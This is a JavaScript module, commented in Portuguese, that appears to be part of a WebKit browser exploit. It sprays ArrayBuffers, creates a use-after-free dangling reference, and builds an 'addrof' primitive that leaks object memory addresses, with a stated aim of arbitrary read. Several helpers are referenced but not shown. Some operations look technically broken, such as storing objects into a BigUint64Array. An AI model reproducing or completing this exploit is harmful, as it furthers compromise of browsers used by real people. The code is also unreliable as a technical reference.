// js/script3/testArrayBufferVictimCrash.mjs (VERSÃO CORRIGIDA E ROBUSTA)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';

// As funções auxiliares e constantes permanecem as mesmas...
// ...

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (ROBUSTA)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = "Robust_UAF_Addrof_Primitive_Builder";
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE} ---`, "test");

    let addrof_result = { success: false, msg: "Addrof: Não iniciado." };
    let errorOccurred = null;
    let addrof_primitive = null; // Aqui vamos armazenar nossa função addrof funcional

    try {
        // -----------------------------------------------------------------------------------
        // FASE 1: CONSTRUIR UMA PRIMITIVA 'ADDROF' CONFIÁVEL
        // -----------------------------------------------------------------------------------
        logS3("--- FASE 1: Construindo a primitiva 'addrof' ---", "subtest");
        
        // Objetos que usaremos para o vazamento.
        let object_to_leak = { marker: 0x41414141 };
        let buffer_for_corruption = new ArrayBuffer(1024);

        await triggerGC();
        let dangling_ref = sprayAndCreateDanglingPointer();
        await triggerGC();
        
        // Pulverizamos com uma estrutura conhecida
        const spray_buffers = [];
        for (let i = 0; i < 512; i++) {
            const buf = new ArrayBuffer(1024);
            const view = new BigUint64Array(buf);
            // Colocamos o objeto que queremos vazar e o buffer lado a lado na memória
            view[0] = object_to_leak;
            view[1] = buffer_for_corruption;
            spray_buffers.push(buf);
        }

        // Se a corrupção funcionou, 'corrupted_prop' agora é uma referência ao nosso 'object_to_leak'
        if (dangling_ref.corrupted_prop.marker !== 0x41414141) {
            throw new Error("Falha na corrupção inicial. O objeto alvo não foi colocado no lugar do UAF.");
        }
        
        logS3("    Corrupção inicial bem-sucedida. Preparando para vazar o endereço do buffer.", "info");

        // Agora, o passo crucial: sobrescrevemos a propriedade corrompida com um double
        // para que, ao lê-la, o motor nos dê o endereço de memória como um double.
        dangling_ref.corrupted_prop = 1.1; // Um double qualquer

        // O endereço do 'buffer_for_corruption' foi agora vazado para o array de spray
        const corrupted_view = new Float64Array(buffer_for_corruption);
        const leaked_double_addr = corrupted_view[0];

        // Convertemos o double para um endereço de 64 bits
        const temp_buf = new ArrayBuffer(8);
        (new Float64Array(temp_buf))[0] = leaked_double_addr;
        const int_view = new Uint32Array(temp_buf);
        const buffer_addr = new AdvancedInt64(int_view[0], int_view[1]);

        if (!isValidPointer(buffer_addr)) {
            throw new Error(`Endereço do buffer vazado (${buffer_addr.toString(true)}) não é um ponteiro válido.`);
        }
        
        logS3(`    Endereço do buffer de corrupção vazado com sucesso: ${buffer_addr.toString(true)}`, "leak");

        // Agora temos uma primitiva addrof!
        const shared_buffer_view = new Float64Array(buffer_for_corruption);
        addrof_primitive = (obj) => {
            shared_buffer_view[0] = obj;
            let leaked_double = (new BigUint64Array(dangling_ref.corrupted_prop))[0];
            const temp_buf_conv = new ArrayBuffer(8);
            (new BigUint64Array(temp_buf_conv))[0] = leaked_double;
            const int_view_conv = new Uint32Array(temp_buf_conv);
            return new AdvancedInt64(int_view_conv[0], int_view_conv[1]);
        };

        logS3("    Primitiva 'addrof' construída com sucesso!", "vuln");

        // -----------------------------------------------------------------------------------
        // FASE 2: USAR A PRIMITIVA PARA O RESTO DO EXPLOIT
        // -----------------------------------------------------------------------------------
        const target_func = function someUniqueTargetFunction() { return "alvo"; };
        const target_addr = addrof_primitive(target_func);
        
        logS3(`    Endereço da função alvo obtido via primitiva: ${target_addr.toString(true)}`, "leak");
        // ... Daqui em diante, você pode continuar com sua lógica de WebKit Leak usando `target_addr`
        // e a primitiva `arb_read`.

    } catch (e) {
        errorOccurred = `ERRO na construção das primitivas: ${e.message}`;
        logS3(errorOccurred, "critical");
    }

    // ... Lógica de retorno e relatório final
    return { errorOccurred, addrof_result /* ... */ };
}
